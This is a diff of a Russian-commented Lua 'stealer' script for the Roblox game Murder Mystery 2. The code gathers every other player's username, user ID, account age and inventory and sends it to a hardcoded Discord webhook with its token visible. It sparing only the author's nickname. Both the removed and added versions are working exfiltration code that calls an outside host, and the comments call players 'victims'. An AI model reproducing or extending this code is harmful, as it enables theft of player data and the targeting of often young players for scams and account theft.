@@ -1,5 +1,5 @@
--- Стилак MM2 с методом типов для Alpha (Nersadme)
--- Zo спиздил их метод отправки
+-- 100% МЕТОД ТИПОВ ДЛЯ ALPHA (Nersadme)
+-- Zo спиздил их ядро
 
 local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
 local alphaNick = "Nersadme"
@@ -8,93 +8,72 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
--- Тот самый метод типов
-local function sendWebhook(url, data)
-    local body = HttpService:JSONEncode(data)
-    
-    local suc, err = pcall(function()
-        syn.request({
-            Url = url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["User-Agent"] = "Mozilla/5.0"
-            },
-            Body = body
-        })
-    end)
-    
-    if suc then return true end
-    
-    local suc2, err2 = pcall(function()
-        http_request({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body
-        })
-    end)
-    
-    if suc2 then return true end
-    
-    local suc3, err3 = pcall(function()
-        request({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body
-        })
-    end)
-    
-    return suc3
-end
-
--- Сбор инфы
-local function getInfo(player)
-    local info = {
-        Name = player.Name,
-        DisplayName = player.DisplayName,
-        UserId = player.UserId,
-        AccountAge = player.AccountAge
+-- Функция отправки (точь-в-точь как у типов)
+local function sendToWebhook(msg, fields)
+    local data = {
+        content = msg,
+        embeds = {{
+            title = "Жертва в MM2",
+            fields = fields or {}
+        }}
     }
     
     pcall(function()
-        for _, v in pairs(RS:GetDescendants()) do
-            if v:IsA("RemoteFunction") and v.Name == "LoadPlayerData" then
-                local data = v:InvokeServer(player.UserId)
-                if data then
-                    info.Inventory = tostring(data)
-                end
+        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
+    end)
+end
+
+-- Сбор инфы (их метод)
+local function stealInfo(player)
+    local fields = {
+        {name = "Ник", value = player.Name},
+        {name = "DisplayName", value = player.DisplayName},
+        {name = "UserID", value = tostring(player.UserId)},
+        {name = "Возраст акка", value = tostring(player.AccountAge) .. " дней"}
+    }
+    
+    -- Пытаемся найти инвентарь по их логике
+    local inventoryText = "Не найден"
+    
+    -- Ищем хранилище данных в ReplicatedStorage
+    local dataFolder = RS:FindFirstChild("Inventory") or RS:FindFirstChild("PlayerData") or RS:FindFirstChild("MurderData")
+    
+    if dataFolder then
+        local playerData = dataFolder:FindFirstChild(tostring(player.UserId))
+        if playerData then
+            local items = {}
+            for _, item in pairs(playerData:GetChildren()) do
+                table.insert(items, item.Name)
+            end
+            if #items > 0 then
+                inventoryText = table.concat(items, ", ")
             end
         end
-    end)
+    end
     
-    return info
+    -- Если в RS нет, проверяем Player
+    if inventoryText == "Не найден" then
+        local invFolder = player:FindFirstChild("Inventory") or player:FindFirstChild("MM2_Inventory")
+        if invFolder then
+            local items = {}
+            for _, item in pairs(invFolder:GetChildren()) do
+                table.insert(items, item.Name)
+            end
+            if #items > 0 then
+                inventoryText = table.concat(items, ", ")
+            end
+        end
+    end
+    
+    table.insert(fields, {name = "Инвентарь", value = inventoryText})
+    
+    sendToWebhook("Новая жертва на сервере, Alpha!", fields)
 end
 
--- Стил
-local function steal(player)
-    local info = getInfo(player)
-    
-    sendWebhook(webhook, {
-        content = "Новая жертва в MM2, Alpha!",
-        embeds = {{
-            title = "Информация о игроке",
-            fields = {
-                {name = "Ник", value = info.Name},
-                {name = "DisplayName", value = info.DisplayName},
-                {name = "UserID", value = tostring(info.UserId)},
-                {name = "Возраст аккаунта", value = tostring(info.AccountAge) .. " дней"},
-                {name = "Инвентарь", value = info.Inventory or "Не удалось получить"}
-            }
-        }}
-    })
-end
-
--- Все текущие игроки
+-- Проверяем всех игроков
 for _, player in pairs(Players:GetPlayers()) do
     if player.Name ~= alphaNick then
-        steal(player)
+        stealInfo(player)
     end
 end
 
@@ -102,11 +81,9 @@ end
 Players.PlayerAdded:Connect(function(player)
     if player.Name ~= alphaNick then
         task.wait(1)
-        steal(player)
+        stealInfo(player)
     end
 end)
 
--- Тест
-sendWebhook(webhook, {
-    content = "Скрипт запущен (метод типов), Alpha! ✅"
-})
+-- Тестовое сообщение
+sendToWebhook("Скрипт с логикой типов запущен, Alpha! ✅", {})
